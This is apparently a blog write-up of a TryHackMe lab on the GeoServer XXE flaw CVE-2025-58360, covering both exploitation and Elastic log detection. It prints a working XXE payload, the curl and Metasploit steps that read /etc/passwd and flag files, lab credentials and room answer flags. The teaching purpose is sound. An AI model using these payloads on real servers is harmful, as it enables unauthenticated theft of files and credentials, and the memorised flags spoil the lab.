---
title: "GeoServer: CVE-2025-58360"
datePublished: Tue Jan 27 2026 20:42:59 GMT+0000 (Coordinated Universal Time)
cuid: cmkx2cfid000102l8h6jtgrli
slug: geoserver-cve-2025-58360
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1769545902276/636d0cb7-8455-4d98-9f08-0dff867a9325.png
tags: xml-parsing, tryhackme-walkthrough, geoserver, cve-2025-58360, xml-vulnerability

---

In late 2025, security researchers discovered CVE-2025-58360, a critical XML External Entity (XXE) vulnerability in GeoServer that's currently being actively exploited in the wild. With a CVSS score of 9.8, this vulnerability allows unauthenticated attackers to read arbitrary files from affected servers and conduct Server-Side Request Forgery (SSRF) attacks—no credentials required.

What makes this particularly urgent is that GeoServer is widely deployed across government agencies, emergency services, utility providers, and private organizations for managing geospatial data. Many of these instances are internet-facing, and according to recent scans, thousands of vulnerable servers are still exposed online. CISA has already added this CVE to their Known Exploited Vulnerabilities catalog, signaling active exploitation attempts in the wild.

If you're running GeoServer versions prior to 2.25.6, or versions 2.26.0-2.26.1, you're vulnerable right now. This isn't a theoretical risk—attackers are actively scanning for and exploiting this vulnerability to exfiltrate sensitive files including passwords, SSH keys, and configuration data.

In this walkthrough, I'll take you through both sides of this vulnerability: how attackers exploit it, and how defenders can detect it. I recently completed the TryHackMe GeoServer room to get hands-on experience with CVE-2025-58360, and I'll share practical insights from both the red team and blue team perspectives. Whether you're a security professional trying to secure your infrastructure or a pentester learning new techniques, understanding this vulnerability is crucial.

Here's what we'll cover:

* **Understanding GeoServer**: What it does and why it's a critical target
    
* **Exploiting the XXE vulnerability**: Step-by-step exploitation using manual payloads and Metasploit
    
* **Detection and analysis**: How to identify exploitation attempts using SIEM tools and log correlation
    
* **Immediate actions**: What to do if you're running GeoServer in your environment
    

Let's dive in and see how a misconfigured XML parser can lead to complete system compromise.

## Introduction

An XML External Entity (XXE) vulnerability was discovered in [GeoServer](https://geoserver.org/) in late 2025 and assigned [CVE-2025-58360](https://nvd.nist.gov/vuln/detail/CVE-2025-58360). This flaw allows unauthenticated attackers to perform arbitrary file reads on the host server and abuse the application for Server-Side Request Forgery (SSRF). The vulnerability received a critical severity rating, with a CVSS score of 9.8, as assessed by NIST.

GeoServer is widely used by governments and private organizations to publish and manage geospatial data, making vulnerabilities in this platform particularly impactful when exposed to the internet. In this room, we will explore GeoServer and its role in real-world infrastructure, walk through exploitation using crafted XML payloads, analyze artifacts left by an attacker, and discuss detection methods.

## **Learning Objectives**

* Understand the role of GeoServer in modern geospatial systems
    
* Explain how XXE vulnerabilities arise in XML parsers
    
* Exploit the vulnerability to retrieve sensitive system files
    
* Analyze web access logs and GeoServer application logs to detect exploitation activity
    

## **Room Prerequisites**

Some familiarity with the Linux command line and prior exposure to XML and XXE vulnerabilities will be helpful. However, all required commands are provided in the walkthrough.

* Check out [XXE Injection](https://tryhackme.com/room/xxeinjection) for an overview of XXE vulnerabilities
    

## Exploring GeoServer

**GeoServer** is an open-source server that enables users to publish, share, and edit geospatial data. Imagine a logistics and transportation company that needs to publish real-time and historical map data for its customers. Their maps may include warehouse or distribution center locations, delivery routes, service areas, and more. Internal dashboards, which we will explore shortly, can be used by the operations team, and public-facing web applications may be used by their customers.

![An image of the GeoServer diamond globe logo.](https://tryhackme-images.s3.amazonaws.com/user-uploads/616945d482ef350052080da1/room-content/616945d482ef350052080da1-1768366677458.png align="left")

## **Who Uses GeoServer?**

GeoServer is widely used across both public and private sectors to manage and distribute geospatial data.

* **Government agencies**: urban planning, transportation, and land management
    
* **Emergency services and disaster response**: visualize incident locations and evacuation routes
    
* **Environmental and climate research**: share satellite imagery or environmental data
    
* **Utility providers**: map and manage infrastructure such as water systems and pipelines
    
* **Private companies**: logistics and mapping to support routing and asset tracking
    

## **Checking Out GeoServer**

Imagine you run a small logistics company that operates several regional offices. To help customers and partners visualize your service coverage, you deploy a public-facing map powered by GeoServer.

This map displays the locations of your regional offices and is embedded into a simple web application called **TryMapMe**. Go ahead and navigate to [`http://MACHINE_IP:8080/trymapme`](http://MACHINE_IP:8080/trymapme) and begin answering the questions below.

![A screenshot of the TryMapMe GeoServer map focused on the TryMapMe headquarters.](https://tryhackme-images.s3.amazonaws.com/user-uploads/616945d482ef350052080da1/room-content/616945d482ef350052080da1-1768366677711.png align="left")

## **GeoServer From the CLI**

While GeoServer is often accessed through web applications and GIS tools, administrators and developers commonly interact with it using the command line. Tools like `curl` are frequently used to test services, validate configuration changes, and troubleshoot issues. These requests are typically sent as HTTP `GET` requests and return structured data such as XML, JSON, or images.

| **Request** | **Purpose** | **Returns** | **Common Usage** |
| --- | --- | --- | --- |
| `GetCapabilities` | List layers & server capabilities | XML metadata | Admin checks and GIS clients |
| `GetMap` | Render map images | PNG/JPEG/SVG | Display maps and snapshots |
| `GetFeatureInfo` | Get attributes at a point | JSON/XML/HTML | Geometry and attribute values for a location |
| `DescribeLayer` | Layer feature metadata | XML | Developer use for layer information |
| `GetLegendGraphic` | Layer legend image | PNG | Web maps and reports |

**Getting Info from GeoServer**

Let's try out a `DescribeLayer` request using the command below to answer the final question of the task.

`curl -s "`[`http://MACHINE_IP:8080/geoserver/wms?service=WMS&version=1.1.1&request=DescribeLayer&layers=trymapme_offices`](http://MACHINE_IP:8080/geoserver/wms?service=WMS&version=1.1.1&request=DescribeLayer&layers=trymapme_offices)`"`

**Command Breakdown**

* `curl -s` sends an HTTP request to the GeoServer instance from the command line
    
* [`http://MACHINE_IP:8080/geoserver/wms`](http://MACHINE_IP:8080/geoserver/wms) specifies the target IP and GeoServer Web Map Service (WMS) endpoint
    
* `service=WMS&version=1.1.1&request=DescribeLayer` defines the service type, protocol version, and operation being requested
    
* `layers=trymapme_offices` specifies the layer for which metadata should be returned
    

### Answer the questions below

1. In which city and state is the TryMapMe South regional office located? `Austin, Texas`  
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769544661155/d2ca5b2e-d29d-4075-8e25-b1c49cfd9f0d.png align="center")
    
      
    
2. Investigate the remaining TryMapMe regional offices. What is the hidden flag value? `THM{geoserver_in_action!}`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769544674981/0f5aa122-6879-4910-bdd7-74d1e4fe2c24.png align="center")
    
      
    
3. Try out the `DescribeLayer` `curl` request from above to investigate the `trymapme_offices` layer.  
    Which `owsType` is listed in the `DescribeLayer` response? `WFS`
    
    ```bash
    curl -s "http://<IP_Address>:8080/geoserver/wms?service=WMS&version=1.1.1&request=DescribeLayer&layers=trymapme_offices"
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769544685293/865b6d0d-ae9d-4e90-a0db-f9b40b88679c.png align="center")
    

## Exploiting GeoServer

Now that you've explored GeoServer and its capabilities, let's dive into what makes this vulnerability possible. XML External Entity vulnerabilities arise when a weakly configured XML parser processes input containing a reference to an external entity. If the parser is not restricted, an attacker can potentially access confidential system files or interact with internal network services. Imagine you're filling out a form that accepts XML as input. Instead of only submitting normal data, you include instructions that tell the parser to get data from somewhere else, say a file you want to read.

## **How the Attack Works**

As we learned in the previous task, GeoServer supports several XML-based request types, including the `GetMap` operation. `GetMap` is often used with HTTP `GET` requests, but GeoServer also allows it to be submitted as XML via a `POST` request. 

When an attacker targets the `GetMap` operation, the vulnerability unfolds in the following steps:

1. **Request:** The attacker sends an HTTP `POST` request to the GeoServer `wms` path containing an XML body
    
2. **Parsing:** The server receives the request and utilizes its internal XML parser to read the instructions
    
3. **Weakness:** Because the parser is not restricted, it processes a `DOCTYPE` declaration that defines an external entity
    
4. **Resolution:** The parser resolves the entity by fetching the resource defined by the attacker (`/etc/passwd`)
    
5. **Processing:** GeoServer processes the map request, unknowingly incorporating the resolved entity content
    
6. **Exfiltration:** The server includes the contents of the sensitive file in the error message returned to the attacker
    

![A visual flow through diagram of how the Geoserver XXE vulnerability unfolds representing each stage of the exploit.](https://tryhackme-images.s3.amazonaws.com/user-uploads/616945d482ef350052080da1/room-content/616945d482ef350052080da1-1768988518176.svg align="left")

**Affected Versions**

The target machine in this room is running GeoServer version 2.26.1, which is vulnerable to the XML External Entity (XXE) issue in the `GetMap` operation. This vulnerability affects versions prior to 2.25.6 as well as 2.26.0 and 2.26.1.

## **The Exploit**

To exploit this vulnerability, you will first craft a malicious XML document, then submit it to GeoServer using a `curl` request that references the XML file.

In the example below, the XML document instructs the server to read the `/etc/hostname` file. Rather than requesting valid map data, the XML forces the parser to load the file's contents. Go ahead and use your favorite text editor to craft the XML document and name it `geoserver.xml`.

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<StyledLayerDescriptor version="1.0.0">
<NamedLayer>
<Name>&xxe;</Name>
</NamedLayer>
</StyledLayerDescriptor>
```

**Submitting Your Request**

Now that you have crafted your XML document, it is time to submit the request to the server. Use the command below, let's attempt to read the `/etc/hostname` file.

`curl -X POST "http://MACHINE_IP:8080/geoserver/wms?REQUEST=GetMap&SERVICE=WMS" -H "Content-Type: application/xml" -d @geoserver.xml`

* `curl -X POST` sends a `POST` request to the target server
    
* `http://MACHINE_IP:8080/geoserver/wms?REQUEST=GetMap&SERVICE=WMS` your target server, port, and GeoServer path
    
* `-H "Content-Type: application/xml"` specifying an XML document
    
* `-d @geoserver.xml` referencing the previously created XML document
    

**Reading the File**

After submitting the request, you will see the following output. The result of the file we want to read, `/etc/hostname`, can be seen following the `Unknown layer:` text.

```bash
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE ServiceExceptionReport SYSTEM "http://MACHINE_IP:8080/geoserver/schemas/wms/1.1.1/WMS_exception_1_1_1.dtd">
<ServiceExceptionReport version="1.1.1">
  <ServiceException>
    Unknown layer: geoserverxxe # contents of /etc/hostname
  </ServiceException>
</ServiceExceptionReport>
```

## **Using Metasploit**

A recent Metasploit [module](https://www.rapid7.com/db/modules/auxiliary/gather/geoserver_wms_getmap_xxe_file_read/) has been developed that makes this exploit even easier. Let's test it against the target machine by launching `msfconsole`, configuring the necessary options, and running the exploit using the following commands. By default, the module reads the `/etc/passwd` file on the host server.

msfconsole xxe

```bash
user@tryhackme$ msfconsole -q

msf6 > use auxiliary/gather/geoserver_wms_getmap_xxe_file_read
msf6 > set RHOSTS MACHINE_IP
msf6 > set RPORT 8080
msf6 > exploit

[*] Running module against MACHINE_IP
[*] Attempting to read file: /etc/passwd
[*] Sending XXE payload to /geoserver/wms?bbox=129.19,68.56,168.73,87.15&format=image/jpeg&height=236&width=172&version=1.1.1&request=GetMap&service=WMS
[+] Successfully read file: /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
```

### Answer the questions below

1. Which GeoServer operation does the XML External Entity vulnerability take advantage of? `GetMap`
    
2. Modify your XML payload or use the Metasploit module to exploit the server.  
    What is the flag located at `/home/ubuntu/flag.txt`? `THM{geoserver_exploited!}`
    
      
    `nano geoserver.xml`
    
    ```bash
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
    ]>
    <StyledLayerDescriptor version="1.0.0">
    <NamedLayer>
    <Name>&xxe;</Name>
    </NamedLayer>
    </StyledLayerDescriptor>
    ```
    
    ```bash
    nano geoserver.xml
    
    curl -X POST "http://<IP_Address>:8080/geoserver/wms?REQUEST=GetMap&SERVICE=WMS" -H "Content-Type: application/xml" -d @geoserver.xml
    <?xml version="1.0" encoding="UTF-8" standalone="no"?><!DOCTYPE ServiceExceptionReport SYSTEM "http://<IP_Address>:8080/geoserver/schemas/wms/1.1.1/WMS_exception_1_1_1.dtd"> <ServiceExceptionReport version="1.1.1" >   <ServiceException>
          Unknown layer: geoserverxxe
    
    </ServiceException></ServiceExceptionReport>
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769544819669/8f4842e9-2508-4877-aca9-315284691324.png align="center")
    
    ```bash
    msfconsole -q
    This copy of metasploit-framework is more than two weeks old.
     Consider running 'msfupdate' to update to the latest version.
    msf6 > use auxiliary/gather/geoserver_wms_getmap_xxe_file_read
    msf6 auxiliary(gather/geoserver_wms_getmap_xxe_file_read) > set RHOSTS 10.49.177.218
    RHOSTS => 10.49.177.218
    msf6 auxiliary(gather/geoserver_wms_getmap_xxe_file_read) > set RPORT 8080
    
    RPORT => 8080
    
    msf6 auxiliary(gather/geoserver_wms_getmap_xxe_file_read) > exploit
    
    [*] Running module against 10.49.177.218
    
    [*] Attempting to read file: /etc/passwd
    
    [*] Sending XXE payload to /geoserver/wms?width=195&height=456&version=1.3.0&format=image/gif&request=GetMap&service=WMS&bbox=4.45,-79.34,95.91,-33.34
    
    [+] Successfully read file: /etc/passwd
    
    root:x:0:0:root:/root:/bin/bash
    
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    
    sys:x:3:3:sys:/dev:/usr/sbin/nologin
    
    sync:x:4:65534:sync:/bin:/bin/sync
    
    games:x:5:60:games:/usr/games:/usr/sbin/nologin
    
    man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
    
    lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
    
    mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
    
    news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
    
    uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
    
    proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
    
    www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
    
    backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
    
    list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
    
    irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
    
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
    
    nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
    
    systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
    
    systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
    
    systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
    
    messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
    
    syslog:x:104:110::/home/syslog:/usr/sbin/nologin
    
    _apt:x:105:65534::/nonexistent:/usr/sbin/nologin
    
    tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
    
    uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
    
    tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
    
    sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
    
    landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
    
    pollinate:x:111:1::/var/cache/pollinate:/bin/false
    
    ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
    
    systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
    
    ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
    
    lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
    
    fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
    
    dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
    
    polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin
    
    elasticsearch:x:115:122::/nonexistent:/bin/false
    
    kibana:x:116:123::/nonexistent:/bin/false
    
    geoserver:x:996:996::/opt/geoserver:/usr/sbin/nologin
    
    tomcat:x:995:995:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
    
    [+] File saved to: /root/.msf4/loot/20260127181548_default_10.49.177.218_geoserver.file_221948.txt
    
    [*] Auxiliary module execution completed
    
    msf6 auxiliary(gather/geoserver_wms_getmap_xxe_file_read) > 
    
    ```
    

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545033622/e59064dd-5b65-4869-b834-591de154c1e9.png align="center")

`set FILEPATH /home/ubuntu/flag.txt`

`exploit`  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545050002/a8c5ac8a-9217-4958-9046-940acf1cdbd5.png align="center")

## Detecting GeoServer

Before diving into detection, it’s important to understand why this vulnerability is particularly dangerous from a defensive perspective. The GeoServer vulnerability we’re investigating allows XML External Entity (XXE) injection, which can result in arbitrary file reads and, in some cases, server-side request forgery (SSRF). Because GeoServer legitimately processes user-supplied XML as part of its normal operations, malicious payloads can be embedded within valid-looking requests.

When paired with the widespread adoption of GeoServer across public and private sector environments that are often exposed to the internet, this vulnerability becomes particularly high risk. Exploitation can occur without authentication and may leave behind minimal forensic evidence, making detection challenging without proper logging and monitoring in place.

## **Investigating Log Data**

Let’s begin our investigation by examining GeoServer’s built-in logging capabilities. 

* Navigate to [`http://MACHINE_IP:8080/geoserver`](http://MACHINE_IP:8080/geoserver)
    
* Login with the default credentials  
    username: `admin`  
    password: `geoserver`
    
* Locate the built-in log viewer `About & Status → GeoServer Logs`
    

GeoServer has several built-in logging capabilities, but by default, it shows only `WARN` and `ERROR` logs in the built-in log viewer. Thankfully, our previously sent requests are visible as errors in the log viewer. By scrolling through the data, you should be able to find the `/etc/hostname` file you read along with the `flag.txt` and `/etc/passwd` output from the previous task. Note that these logs are quite noisy, so manually reviewing them is not the ideal method of investigation.

![A screenshot of the native GeoServer log viewer highlighting the ERROR log in which the attacker read the /etc/hostname file on the target server.](https://tryhackme-images.s3.amazonaws.com/user-uploads/616945d482ef350052080da1/room-content/616945d482ef350052080da1-1768987446445.svg align="left")

## **SIEM View**

In this lab, Elastic is running on the target machine, enabling us to centrally search and analyze both GeoServer and Tomcat access logs. Let’s switch over to Elastic and begin our investigation.

* Navigate to [`http://MACHINE_IP`](http://MACHINE_IP)
    
* Login using the credentials below  
    username: `elastic`  
    password: `geoserverxxe`
    

Let's first filter for `geoserver_app` logs by either selecting the `log_type` field in the left panel or entering the query `log_type: geoserver_app`. These logs have been parsed so that the output message from the file read is held in a field named `file_output`.

In the screenshot below, you can see we found our first request in which we read the `/etc/hostname` file.

1. Filter for `log_type: geoserver_app`
    
2. Check out the `file_output` field
    

![A screenshot of the geoserver Data view in Kibana, highlighting the geoserver_app logs and the file_output field. ](https://tryhackme-images.s3.amazonaws.com/user-uploads/616945d482ef350052080da1/room-content/616945d482ef350052080da1-1768987446165.svg align="left")

**Access Logs**

GeoServer’s native logging capabilities are not the only source of visibility available to an analyst. Because GeoServer runs on Apache Tomcat, we can also investigate web access logs, which often provide clearer insight into how an application is used over HTTP.

If you recall from the previous tasks, requests sent to GeoServer from the command line are typically `GET` requests, but we used `POST` requests to include our XML documents. This makes it much easier to search for our target logs.

It is important to note that web access logs record request metadata, not request bodies. Because the file targeted by the attacker is defined within the XML document itself, the specific file being requested, like `/etc/passwd`, is not directly visible in the access log data. Instead, analysts must correlate `POST` requests in the access logs with GeoServer application logs and error messages to determine what actions were performed and what data may have been accessed.

By building a table from both log sources, we can correlate HTTP requests with application responses, allowing us to reconstruct the attacker’s activity even when portions of the payload are not logged. In the example below, the `POST` request and the resulting flag value from the previous task have been highlighted.

1. Add the following fields as columns  
    `log_type`  
    `file_output`  
    `http.request.method`  
    `url.path`
    
2. `POST` request sent to the server
    
3. GeoServer application log with the flag value output
    

![A screenshot of the geoserver Data view within Kibana, highlighting the selected fields, HTTP POST request, and the correlated geoserver_app log.](https://tryhackme-images.s3.amazonaws.com/user-uploads/616945d482ef350052080da1/room-content/616945d482ef350052080da1-1768987782869.svg align="left")

## **Investigation**

Let's put all of this information into practice with a mini investigation. The log data for this portion of the task has been added to a new Data view in your Elastic instance. Go ahead and select the `investigation` Data view in the top-left corner, and make sure you're searching within the time range from `January 10, 2026`. Begin answering the questions below!

![A screenshot of the Kibana interface highlighting the investigation Data view.](https://tryhackme-images.s3.amazonaws.com/user-uploads/616945d482ef350052080da1/room-content/616945d482ef350052080da1-1769061591460.svg align="left")

### Following steps for examining GeoServer’s built-in logging capabilities

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545164943/ff01732a-9b81-4315-87a0-c8ef73202097.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545236167/505ac3e7-1dbc-4386-85b4-d67e03655cd2.png align="center")

  

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545288392/dab06e27-88ff-420b-a0e8-29e3b2155ef5.png align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545249306/677f86ec-37a9-4a70-bf89-50abdfd0684e.png align="center")

### Answer the questions below

1. How many `POST` requests are found within the available investigation log data? `2`  
      
    remember to change the `Data view` to `investigation` then search: `http.request.method: POST`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545328494/9d34b74e-4faf-4ec0-b589-a4c34b17c8c7.png align="center")
    
      
      
    
2. Which `source.ip` is responsible for the `POST` requests sent to the server? `203.0.113.45`  
      
    If you’ve used a SIEM tool before, it won’t be so hard to filter out the keywords, but they can be a bit of an issue. Take your time to understand the walkthrough and try doing the same or making adjustments to get the right results.  
      
    still on the above search: `http.request.method: POST` We have to expand one of the outputs, then check the `source.ip`  
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545399526/03118e45-cb22-4e51-9629-598a74e953bb.png align="center")
    
      
    
3. Highlight the `file_output` field in the `geoserver_app` logs.  
    What is the password found for the user `trymapme`? `you_found_me!`  
      
    This was a bit of a challenge had to look around extensively. I was wondering why we were not given a hint, so I was overthinking, trying to figure what to add to the search to accommodate the user, but none worked. Once I tried again, I used `investigation` data view and the `log_type: “geoserver_app”`  
    
    ![this was wrong ](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545705603/78b298cb-9495-4abb-a250-d98150b93734.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545723585/05480f8a-dedc-456f-8769-36bfbcd91b48.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769545739002/39df5bd5-222e-44a1-b24a-33ab4a118744.png align="center")
    
      
      
    
4. Continue investigating the `geoserver_app` logs.  
    What is the flag value the attacker found? `THM{detect_geoserver_xxe!}`
    

## Conclusion

In this room, you explored a GeoServer XML External Entity (XXE) vulnerability associated with CVE-2025-58360. You practiced exploiting a vulnerable GeoServer instance by crafting a malicious XML document and submitting it via a `curl` request, then used a Metasploit module to read sensitive files from the system. You then shifted into the defender’s role, investigating evidence of exploitation using GeoServer’s native log viewer and analyzing logs in Elastic to identify suspicious activity and reconstruct the attack timeline.

## **Patching and Prevention**

While detection and investigation are critical, the most effective defense against XXE is prevention through proper patching and hardening. GeoServer should be kept up to date with the latest security releases, and XML parsers should be configured to disable external entity resolution if possible.

CVE-2025-58360 is a stark reminder that critical vulnerabilities don't just exist in mainstream applications—they're hiding in specialized software that powers essential infrastructure. This XXE vulnerability in GeoServer demonstrates how a single misconfiguration in XML parsing can expose sensitive files, credentials, and internal network resources to unauthenticated attackers.

### Why This Matters Right Now

This isn't ancient history—CVE-2025-58360 was discovered just months ago in late 2025, and organizations are still scrambling to patch. According to Shodan, over 14,000 GeoServer instances remain exposed to the internet, and CISA's inclusion of this vulnerability in their KEV catalog confirms active exploitation. If you haven't patched yet, attackers may have already enumerated your infrastructure.

### What I Learned

Working through this TryHackMe lab gave me invaluable perspective from both sides:

**As an attacker**, the exploitation is almost trivially easy. A simple XML payload submitted via cURL can read `/etc/passwd`, SSH keys, database credentials, or any file the GeoServer process can access. The Metasploit module makes it even simpler. No authentication, no complex exploit chains—just POST an XML document and read the response.

**As a defender**, detection requires proper logging and correlation. GeoServer's native logs capture the file reads, but they're noisy and difficult to parse manually. The real power comes from centralizing logs in a SIEM like Elastic, where you can correlate POST requests to `/geoserver/wms` with the resulting file exfiltration. The key indicators are:

* POST requests to endpoints that normally use GET
    
* Unusual file access patterns in application logs
    
* The presence of DOCTYPE declarations in request bodies
    

### Immediate Action Items

If you're responsible for GeoServer in your organization, here's what you need to do today:

1. **Identify your exposure**: Find all GeoServer instances in your environment, especially internet-facing ones
    
2. **Patch immediately**: Upgrade to version 2.25.6, 2.26.2, 2.27.0, or later
    
3. **Check for compromise**: Review logs from the past 3-6 months for POST requests to `/geoserver/wms` and suspicious file access
    
4. **Implement monitoring**: Set up SIEM alerts for POST requests to GeoServer endpoints and enable comprehensive application logging
    
5. **Harden access**: If possible, place GeoServer behind authentication or VPN access
    

### Defense in Depth

Even after patching, implement these additional controls:

* Disable XML external entity processing in your parser configuration
    
* Use Web Application Firewalls (WAF) to block requests containing DOCTYPE declarations
    
* Implement network segmentation to limit what files GeoServer can access
    
* Practice least privilege—run GeoServer with minimal file system permissions
    

### Final Thoughts

This walkthrough showed me that XXE vulnerabilities are far from theoretical. They're actively exploited, easy to execute, and can have devastating consequences. What struck me most was how quickly an attacker can go from discovering a vulnerable GeoServer instance to reading sensitive files—literally minutes.

For defenders, this reinforces the critical importance of rapid patching, comprehensive logging, and security monitoring. The tools exist to detect these attacks, but only if you've implemented proper logging and analysis capabilities before an incident occurs.

If your organization uses GeoServer, don't wait. Patch now, audit your logs, and implement monitoring. The attackers already know about this vulnerability—make sure your defenses do too.

**Resources:**

* [TryHackMe GeoServer Room](https://tryhackme.com/r/room/geoserver)
    
* [CVE-2025-58360 NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2025-58360)
    
* [GeoServer Security Advisory](https://github.com/geoserver/geoserver/security/advisories)
    
* [CISA KEV Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)
    

Stay vigilant, patch quickly, and keep learning. The next critical vulnerability could be discovered tomorrow.